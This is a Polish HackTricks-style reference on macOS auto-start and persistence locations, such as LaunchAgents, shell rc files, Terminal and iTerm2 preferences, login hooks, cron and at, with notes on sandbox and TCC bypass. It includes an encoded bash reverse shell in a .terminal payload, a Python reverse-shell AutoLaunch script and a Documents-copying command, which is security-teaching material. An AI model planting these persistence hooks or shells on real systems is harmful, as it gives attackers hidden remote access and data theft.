# macOS Auto Start

{{#include ../banners/hacktricks-training.md}}

Ta sekcja jest w dużej mierze oparta na serii blogów [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/), celem jest dodanie **więcej lokalizacji autostartu** (jeśli to możliwe), wskazanie **które techniki nadal działają** w dzisiejszych czasach z najnowszą wersją macOS (13.4) oraz określenie **wymaganych uprawnień**.

## Sandbox Bypass

> [!TIP]
> Tutaj możesz znaleźć lokalizacje startowe przydatne do **sandbox bypass**, które pozwalają na proste wykonanie czegoś poprzez **zapisanie tego do pliku** i **czekanie** na bardzo **powszechną** **akcję**, określoną **ilość czasu** lub **akcję, którą zazwyczaj możesz wykonać** z wnętrza sandboxu bez potrzeby posiadania uprawnień roota.

### Launchd

- Przydatne do obejścia sandboxu: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacje

- **`/Library/LaunchAgents`**
- **Wyzwalacz**: Restart
- Wymagany root
- **`/Library/LaunchDaemons`**
- **Wyzwalacz**: Restart
- Wymagany root
- **`/System/Library/LaunchAgents`**
- **Wyzwalacz**: Restart
- Wymagany root
- **`/System/Library/LaunchDaemons`**
- **Wyzwalacz**: Restart
- Wymagany root
- **`~/Library/LaunchAgents`**
- **Wyzwalacz**: Ponowne logowanie
- **`~/Library/LaunchDemons`**
- **Wyzwalacz**: Ponowne logowanie

> [!TIP]
> Jako ciekawostka, **`launchd`** ma wbudowaną listę właściwości w sekcji Mach-o `__Text.__config`, która zawiera inne dobrze znane usługi, które launchd musi uruchomić. Ponadto, te usługi mogą zawierać `RequireSuccess`, `RequireRun` i `RebootOnSuccess`, co oznacza, że muszą być uruchomione i zakończone pomyślnie.
>
> Oczywiście, nie można ich modyfikować z powodu podpisywania kodu.

#### Opis i Eksploatacja

**`launchd`** jest **pierwszym** **procesem** wykonywanym przez jądro OX S podczas uruchamiania i ostatnim, który kończy się podczas zamykania. Zawsze powinien mieć **PID 1**. Ten proces **odczyta i wykona** konfiguracje wskazane w **ASEP** **plistach** w:

- `/Library/LaunchAgents`: Agenci per użytkownik zainstalowani przez administratora
- `/Library/LaunchDaemons`: Demony systemowe zainstalowane przez administratora
- `/System/Library/LaunchAgents`: Agenci per użytkownik dostarczani przez Apple.
- `/System/Library/LaunchDaemons`: Demony systemowe dostarczane przez Apple.

Gdy użytkownik loguje się, plisty znajdujące się w `/Users/$USER/Library/LaunchAgents` i `/Users/$USER/Library/LaunchDemons` są uruchamiane z **uprawnieniami zalogowanego użytkownika**.

**Główna różnica między agentami a demonami polega na tym, że agenci są ładowani, gdy użytkownik się loguje, a demony są ładowane podczas uruchamiania systemu** (ponieważ są usługi takie jak ssh, które muszą być uruchomione przed tym, jak jakikolwiek użytkownik uzyska dostęp do systemu). Agenci mogą również korzystać z GUI, podczas gdy demony muszą działać w tle.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Są przypadki, w których **agent musi być uruchomiony przed zalogowaniem użytkownika**, nazywane są **PreLoginAgents**. Na przykład, jest to przydatne do zapewnienia technologii wspomagającej przy logowaniu. Można je również znaleźć w `/Library/LaunchAgents` (zobacz [**tutaj**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) przykład).

> [!NOTE]
> Nowe pliki konfiguracyjne Daemons lub Agents będą **ładowane po następnym uruchomieniu lub przy użyciu** `launchctl load <target.plist>`. Można **również załadować pliki .plist bez tego rozszerzenia** za pomocą `launchctl -F <file>` (jednak te pliki plist nie będą automatycznie ładowane po uruchomieniu).\
> Można również **odłączyć** za pomocą `launchctl unload <target.plist>` (proces wskazany przez niego zostanie zakończony),
>
> Aby **upewnić się**, że nie ma **niczego** (jak nadpisanie) **zapobiegającego** **uruchomieniu** **Agenta** lub **Daemona**, uruchom: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`

Wylistuj wszystkie agenty i demony załadowane przez bieżącego użytkownika:
```bash
launchctl list
```
> [!WARNING]
> Jeśli plist jest własnością użytkownika, nawet jeśli znajduje się w systemowych folderach demona, **zadanie zostanie wykonane jako użytkownik** a nie jako root. Może to zapobiec niektórym atakom eskalacji uprawnień.

#### Więcej informacji o launchd

**`launchd`** jest **pierwszym** procesem w trybie użytkownika, który jest uruchamiany z **jądra**. Uruchomienie procesu musi być **udane** i **nie może zakończyć się błędem ani awarią**. Jest nawet **chronione** przed niektórymi **sygnałami zabicia**.

Jedną z pierwszych rzeczy, które `launchd` zrobi, jest **uruchomienie** wszystkich **demonów**, takich jak:

- **Demony czasowe** oparte na czasie do wykonania:
- atd (`com.apple.atrun.plist`): Ma `StartInterval` wynoszący 30 minut
- crond (`com.apple.systemstats.daily.plist`): Ma `StartCalendarInterval`, aby uruchomić o 00:15
- **Demony sieciowe** takie jak:
- `org.cups.cups-lpd`: Nasłuchuje w TCP (`SockType: stream`) z `SockServiceName: printer`
- SockServiceName musi być portem lub usługą z `/etc/services`
- `com.apple.xscertd.plist`: Nasłuchuje na TCP na porcie 1640
- **Demony ścieżkowe**, które są uruchamiane, gdy zmienia się określona ścieżka:
- `com.apple.postfix.master`: Sprawdza ścieżkę `/etc/postfix/aliases`
- **Demony powiadomień IOKit**:
- `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Port Mach:**
- `com.apple.xscertd-helper.plist`: Wskazuje w wpisie `MachServices` nazwę `com.apple.xscertd.helper`
- **UserEventAgent:**
- To różni się od poprzedniego. Sprawia, że launchd uruchamia aplikacje w odpowiedzi na określone zdarzenie. Jednak w tym przypadku główny binarny plik zaangażowany to nie `launchd`, ale `/usr/libexec/UserEventAgent`. Ładuje wtyczki z folderu ograniczonego przez SIP /System/Library/UserEventPlugins/, gdzie każda wtyczka wskazuje swój inicjalizator w kluczu `XPCEventModuleInitializer` lub, w przypadku starszych wtyczek, w słowniku `CFPluginFactories` pod kluczem `FB86416D-6164-2070-726F-70735C216EC0` w swoim `Info.plist`.

### pliki startowe powłoki

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

- Przydatne do obejścia piaskownicy: [✅](https://emojipedia.org/check-mark-button)
- Obejście TCC: [✅](https://emojipedia.org/check-mark-button)
- Ale musisz znaleźć aplikację z obejściem TCC, która uruchamia powłokę ładującą te pliki

#### Lokalizacje

- **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
- **Wyzwalacz**: Otwórz terminal z zsh
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
- **Wyzwalacz**: Otwórz terminal z zsh
- Wymagany root
- **`~/.zlogout`**
- **Wyzwalacz**: Wyjdź z terminala z zsh
- **`/etc/zlogout`**
- **Wyzwalacz**: Wyjdź z terminala z zsh
- Wymagany root
- Potencjalnie więcej w: **`man zsh`**
- **`~/.bashrc`**
- **Wyzwalacz**: Otwórz terminal z bash
- `/etc/profile` (nie działa)
- `~/.profile` (nie działa)
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
- **Wyzwalacz**: Oczekiwano, że wyzwoli się z xterm, ale **nie jest zainstalowany** i nawet po zainstalowaniu pojawia się ten błąd: xterm: `DISPLAY is not set`

#### Opis i wykorzystanie

Podczas inicjowania środowiska powłoki, takiego jak `zsh` lub `bash`, **uruchamiane są określone pliki startowe**. macOS obecnie używa `/bin/zsh` jako domyślnej powłoki. Ta powłoka jest automatycznie dostępna, gdy aplikacja Terminal jest uruchamiana lub gdy urządzenie jest dostępne przez SSH. Chociaż `bash` i `sh` są również obecne w macOS, muszą być wyraźnie wywołane, aby mogły być używane.

Strona podręczna zsh, którą możemy przeczytać za pomocą **`man zsh`**, zawiera długi opis plików startowych.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Ponownie otwarte aplikacje

> [!OSTRZEŻENIE]
> Konfigurowanie wskazanej eksploatacji oraz wylogowywanie i ponowne logowanie lub nawet ponowne uruchamianie nie działało dla mnie, aby uruchomić aplikację. (Aplikacja nie była uruchamiana, być może musi być uruchomiona, gdy te działania są wykonywane)

**Opis**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)

- Przydatne do obejścia piaskownicy: [✅](https://emojipedia.org/check-mark-button)
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **Wyzwalacz**: Ponowne uruchomienie otwierania aplikacji

#### Opis i eksploatacja

Wszystkie aplikacje do ponownego otwarcia znajdują się w pliku plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`

Aby sprawić, by ponownie otwierane aplikacje uruchamiały twoją, wystarczy **dodać swoją aplikację do listy**.

UUID można znaleźć, wylistowując ten katalog lub używając `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Aby sprawdzić aplikacje, które będą ponownie otwierane, możesz to zrobić:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Aby **dodać aplikację do tej listy** możesz użyć:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Preferencje Terminala

- Przydatne do obejścia piaskownicy: [✅](https://emojipedia.org/check-mark-button)
- Obejście TCC: [✅](https://emojipedia.org/check-mark-button)
- Terminal ma uprawnienia FDA użytkownika, który go używa

#### Lokalizacja

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **Wyzwalacz**: Otwórz Terminal

#### Opis i Wykorzystanie

W **`~/Library/Preferences`** przechowywane są preferencje użytkownika w Aplikacjach. Niektóre z tych preferencji mogą zawierać konfigurację do **wykonywania innych aplikacji/skryptów**.

Na przykład, Terminal może wykonać polecenie przy uruchomieniu:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Ta konfiguracja jest odzwierciedlona w pliku **`~/Library/Preferences/com.apple.Terminal.plist`** w ten sposób:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Więc, jeśli plist preferencji terminala w systemie mógłby być nadpisany, to funkcjonalność **`open`** może być użyta do **otwarcia terminala i wykonania tego polecenia**.

Możesz to dodać z poziomu cli za pomocą:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Terminal Scripts / Inne rozszerzenia plików

- Przydatne do obejścia sandbox: [✅](https://emojipedia.org/check-mark-button)
- Obejście TCC: [✅](https://emojipedia.org/check-mark-button)
- Terminal używa uprawnień FDA użytkownika, który go używa

#### Lokalizacja

- **Gdziekolwiek**
- **Wyzwalacz**: Otwórz Terminal

#### Opis i Eksploatacja

Jeśli stworzysz [**`.terminal`** script](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) i go otworzysz, **aplikacja Terminal** zostanie automatycznie wywołana do wykonania wskazanych tam poleceń. Jeśli aplikacja Terminal ma jakieś specjalne uprawnienia (takie jak TCC), twoje polecenie zostanie wykonane z tymi specjalnymi uprawnieniami.

Spróbuj to z:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
Możesz również użyć rozszerzeń **`.command`**, **`.tool`**, z zawartością zwykłych skryptów powłoki, a będą one również otwierane przez Terminal.

> [!CAUTION]
> Jeśli terminal ma **Pełny dostęp do dysku**, będzie w stanie wykonać tę akcję (zauważ, że wykonana komenda będzie widoczna w oknie terminala).

### Wtyczki audio

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

- Przydatne do obejścia piaskownicy: [✅](https://emojipedia.org/check-mark-button)
- Obejście TCC: [🟠](https://emojipedia.org/large-orange-circle)
- Możesz uzyskać dodatkowy dostęp do TCC

#### Lokalizacja

- **`/Library/Audio/Plug-Ins/HAL`**
- Wymagane uprawnienia roota
- **Wyzwalacz**: Uruchom ponownie coreaudiod lub komputer
- **`/Library/Audio/Plug-ins/Components`**
- Wymagane uprawnienia roota
- **Wyzwalacz**: Uruchom ponownie coreaudiod lub komputer
- **`~/Library/Audio/Plug-ins/Components`**
- **Wyzwalacz**: Uruchom ponownie coreaudiod lub komputer
- **`/System/Library/Components`**
- Wymagane uprawnienia roota
- **Wyzwalacz**: Uruchom ponownie coreaudiod lub komputer

#### Opis

Zgodnie z wcześniejszymi opisami, możliwe jest **kompilowanie niektórych wtyczek audio** i załadowanie ich.

### Wtyczki QuickLook

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)

- Przydatne do obejścia piaskownicy: [✅](https://emojipedia.org/check-mark-button)
- Obejście TCC: [🟠](https://emojipedia.org/large-orange-circle)
- Możesz uzyskać dodatkowy dostęp do TCC

#### Lokalizacja

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Opis i eksploatacja

Wtyczki QuickLook mogą być wykonywane, gdy **wyzwolisz podgląd pliku** (naciśnij spację z wybranym plikiem w Finderze) i zainstalowana jest **wtyczka obsługująca ten typ pliku**.

Możliwe jest skompilowanie własnej wtyczki QuickLook, umieszczenie jej w jednej z wcześniejszych lokalizacji, aby ją załadować, a następnie przejście do obsługiwanego pliku i naciśnięcie spacji, aby ją wyzwolić.

### ~~Hooki logowania/wylogowania~~

> [!CAUTION]
> To nie zadziałało dla mnie, ani z LoginHook użytkownika, ani z LogoutHook roota

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)

- Przydatne do obejścia piaskownicy: [✅](https://emojipedia.org/check-mark-button)
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- Musisz być w stanie wykonać coś takiego jak `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
- `Lo`cated in `~/Library/Preferences/com.apple.loginwindow.plist`

Są przestarzałe, ale mogą być używane do wykonywania poleceń, gdy użytkownik się loguje.
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
To ustawienie jest przechowywane w `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Aby to usunąć:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
Użytkownik root jest przechowywany w **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Ominięcie piaskownicy warunkowej

> [!TIP]
> Tutaj możesz znaleźć lokalizacje startowe przydatne do **ominięcia piaskownicy**, które pozwalają na proste wykonanie czegoś poprzez **zapisanie tego w pliku** i **oczekiwanie na nie super powszechne warunki**, takie jak konkretne **zainstalowane programy, "niezwykłe" działania użytkowników** lub środowiska.

### Cron

**Opis**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)

- Przydatne do ominięcia piaskownicy: [✅](https://emojipedia.org/check-mark-button)
- Jednak musisz być w stanie wykonać binarny plik `crontab`
- Lub być rootem
- Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- Wymagany root do bezpośredniego dostępu do zapisu. Nie jest wymagany root, jeśli możesz wykonać `crontab <file>`
- **Wyzwalacz**: Zależy od zadania cron

#### Opis i wykorzystanie

Wylistuj zadania cron **bieżącego użytkownika** za pomocą:
```bash
crontab -l
```
Możesz również zobaczyć wszystkie zadania cron użytkowników w **`/usr/lib/cron/tabs/`** i **`/var/at/tabs/`** (wymaga uprawnień roota).

W MacOS można znaleźć kilka folderów wykonujących skrypty z **określoną częstotliwością** w:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Można tam znaleźć regularne **cron** **jobs**, **at** **jobs** (niezbyt używane) oraz **periodic** **jobs** (głównie używane do czyszczenia plików tymczasowych). Codzienne zadania okresowe można wykonać na przykład za pomocą: `periodic daily`.

Aby programowo dodać **user cronjob**, można użyć:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)

- Przydatne do obejścia sandbox: [✅](https://emojipedia.org/check-mark-button)
- Obejście TCC: [✅](https://emojipedia.org/check-mark-button)
- iTerm2 miało przyznane uprawnienia TCC

#### Locations

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **Trigger**: Otwórz iTerm
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **Trigger**: Otwórz iTerm
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **Trigger**: Otwórz iTerm

#### Description & Exploitation

Skrypty przechowywane w **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** będą wykonywane. Na przykład:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
or:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
Skrypt **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** również zostanie wykonany:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
Preferencje iTerm2 znajdujące się w **`~/Library/Preferences/com.googlecode.iterm2.plist`** mogą **wskazywać polecenie do wykonania** po otwarciu terminala iTerm2.

To ustawienie można skonfigurować w ustawieniach iTerm2:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

A polecenie jest odzwierciedlone w preferencjach:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Możesz ustawić polecenie do wykonania za pomocą:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> Wysoce prawdopodobne, że istnieją **inne sposoby nadużycia preferencji iTerm2** do wykonywania dowolnych poleceń.

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)

- Przydatne do obejścia sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ale xbar musi być zainstalowany
- Obejście TCC: [✅](https://emojipedia.org/check-mark-button)
- Wymaga uprawnień dostępu

#### Lokalizacja

- **`~/Library/Application\ Support/xbar/plugins/`**
- **Wyzwalacz**: Po uruchomieniu xbar

#### Opis

Jeśli popularny program [**xbar**](https://github.com/matryer/xbar) jest zainstalowany, możliwe jest napisanie skryptu powłoki w **`~/Library/Application\ Support/xbar/plugins/`**, który zostanie wykonany po uruchomieniu xbar:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)

- Przydatne do obejścia sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ale Hammerspoon musi być zainstalowany
- Obejście TCC: [✅](https://emojipedia.org/check-mark-button)
- Wymaga uprawnień dostępu

#### Location

- **`~/.hammerspoon/init.lua`**
- **Trigger**: Po uruchomieniu hammerspoon

#### Description

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) służy jako platforma automatyzacji dla **macOS**, wykorzystując **język skryptowy LUA** do swoich operacji. Co ważne, wspiera integrację pełnego kodu AppleScript oraz wykonywanie skryptów powłoki, znacznie zwiększając swoje możliwości skryptowe.

Aplikacja szuka pojedynczego pliku, `~/.hammerspoon/init.lua`, a po uruchomieniu skrypt zostanie wykonany.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- Przydatne do obejścia sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ale BetterTouchTool musi być zainstalowany
- Obejście TCC: [✅](https://emojipedia.org/check-mark-button)
- Wymaga uprawnień do Automatyzacji-Skrótów i Dostępności

#### Location

- `~/Library/Application Support/BetterTouchTool/*`

To narzędzie pozwala wskazać aplikacje lub skrypty do wykonania, gdy naciśnięte zostaną niektóre skróty. Atakujący może skonfigurować własny **skrót i akcję do wykonania w bazie danych**, aby uruchomić dowolny kod (skrót może polegać po prostu na naciśnięciu klawisza).

### Alfred

- Przydatne do obejścia sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ale Alfred musi być zainstalowany
- Obejście TCC: [✅](https://emojipedia.org/check-mark-button)
- Wymaga uprawnień do Automatyzacji, Dostępności, a nawet Pełnego Dostępu do Dysku

#### Location

- `???`

Pozwala na tworzenie przepływów pracy, które mogą wykonywać kod, gdy spełnione są określone warunki. Potencjalnie atakujący może stworzyć plik przepływu pracy i sprawić, aby Alfred go załadował (konieczne jest opłacenie wersji premium, aby korzystać z przepływów pracy).

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)

- Przydatne do obejścia sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ale ssh musi być włączone i używane
- Obejście TCC: [✅](https://emojipedia.org/check-mark-button)
- Użycie SSH wymaga dostępu FDA

#### Location

- **`~/.ssh/rc`**
- **Trigger**: Logowanie przez ssh
- **`/etc/ssh/sshrc`**
- Wymagany root
- **Trigger**: Logowanie przez ssh

> [!CAUTION]
> Aby włączyć ssh, wymagany jest Pełny Dostęp do Dysku:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Description & Exploitation

Domyślnie, chyba że `PermitUserRC no` w `/etc/ssh/sshd_config`, gdy użytkownik **loguje się przez SSH**, skrypty **`/etc/ssh/sshrc`** i **`~/.ssh/rc`** będą wykonywane.

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)

- Przydatne do obejścia sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ale musisz wykonać `osascript` z argumentami
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Trigger:** Logowanie
- Payload exploitu przechowywany w wywołaniu **`osascript`**
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Trigger:** Logowanie
- Wymagany root

#### Description

W Preferencjach Systemowych -> Użytkownicy i Grupy -> **Elementy logowania** możesz znaleźć **elementy do wykonania, gdy użytkownik się loguje**.\
Możliwe jest ich wylistowanie, dodawanie i usuwanie z linii poleceń:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Te elementy są przechowywane w pliku **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

**Elementy logowania** mogą **również** być wskazane przy użyciu API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc), które zapisze konfigurację w **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**

### ZIP jako Element Logowania

(Zobacz poprzednią sekcję o Elementach Logowania, to jest rozszerzenie)

Jeśli przechowasz plik **ZIP** jako **Element Logowania**, **`Archive Utility`** go otworzy, a jeśli zip był na przykład przechowywany w **`~/Library`** i zawierał folder **`LaunchAgents/file.plist`** z backdoorem, ten folder zostanie utworzony (nie jest to domyślne) i plist zostanie dodany, więc następnym razem, gdy użytkownik się zaloguje, **backdoor wskazany w plist zostanie wykonany**.

Inną opcją byłoby utworzenie plików **`.bash_profile`** i **`.zshenv`** w katalogu domowym użytkownika, więc jeśli folder LaunchAgents już istnieje, ta technika nadal będzie działać.

### At

Opis: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)

- Przydatne do obejścia sandboxu: [✅](https://emojipedia.org/check-mark-button)
- Ale musisz **wykonać** **`at`** i musi być **włączone**
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- Musisz **wykonać** **`at`** i musi być **włączone**

#### **Opis**

Zadania `at` są zaprojektowane do **planowania jednorazowych zadań** do wykonania w określonych czasach. W przeciwieństwie do zadań cron, zadania `at` są automatycznie usuwane po wykonaniu. Ważne jest, aby zauważyć, że te zadania są trwałe po ponownym uruchomieniu systemu, co czyni je potencjalnymi zagrożeniami bezpieczeństwa w określonych warunkach.

Domyślnie są **wyłączone**, ale użytkownik **root** może **je włączyć** za pomocą:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
To stworzy plik za 1 godzinę:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Sprawdź kolejkę zadań za pomocą `atq:`
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
